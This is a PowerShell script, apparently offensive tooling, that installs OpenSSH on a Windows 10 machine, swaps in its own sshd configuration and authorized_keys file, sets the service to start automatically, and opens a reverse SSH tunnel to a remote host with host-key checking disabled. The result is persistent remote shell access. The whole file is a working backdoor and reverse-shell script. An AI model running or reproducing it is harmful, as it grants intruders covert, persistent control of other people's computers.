# LOL-ReverseSSHell.ps1 - Living Off the LAN Reverse Shell (cmd & powershell) over SSH  
# This script will install OpenSSH on Windows 10 & create a Reverse Shell over ssh  
# Author: Arron Jablonowski  
# Last Modified: 2.15.2021
# Version: 0.5 - BETA 

# Remote Host (dest)  
$RHOST = "192.168.100.15" # Remote destination IP 
$RUSER = "aj" # Remote user to create SSH connection  
$RPORT = "7777" #Remote local port (Tunnel is over ssh port/default 22) 

# OpenSSH Server 
$openSSHServer = Get-WindowsCapability -Online | Where-Object Name -like "OpenSSH.Server*"
Add-WindowsCapability -Online -Name $openSSHServer.Name 

# Start & Stop the service to create sshd config files 
$sshDaemonSrv = Get-Service -Name "sshd"
Start-service -name $sshDaemonSrv.Name 
Start-Sleep 1
Stop-Service -Name $sshDaemonSrv.Name 
 
# SSH config file 
Remove-Item "$env:PROGRAMDATA\ssh\sshd_config" -Force # Remove default sshd config 
Copy-Item ".\sshd_config" "$env:PROGRAMDATA\ssh\sshd_config" -Force # replace with our sshd_config file  

mkdir "$HOME\.ssh" # make Windows SSH dir 

# Authorized Keys file 
$authorizedKeyFilePath = "$HOME\.ssh\authorized_keys"
copy-item ".\authorized_keys" $authorizedKeyFilePath -Force # authorized_keys

$sshDaemonSrv = Get-Service -name "sshd"
Set-Service -name $sshDaemonSrv.name -StartupType Automatic # set sshd startup to Auto 
Start-Service -name $sshDaemonSrv.Name # start sshd 

# Setup Reverse SSH connection to Remote Host 
copy-item ".\winkey" "$HOME\.ssh\winkey" -Force # copy priv key for reverse connection 
Start-Sleep 10 # Wait for service to fully start 
Write-Verbose "On $RHOST type: ssh $env:UserName@localhost -p $RPORT" -Verbose
ssh.exe -fN -R $RPORT`:127.0.0.1:22 "$RUSER@$RHOST" -i "$HOME\.ssh\winkey" -o "StrictHostKeyChecking=no"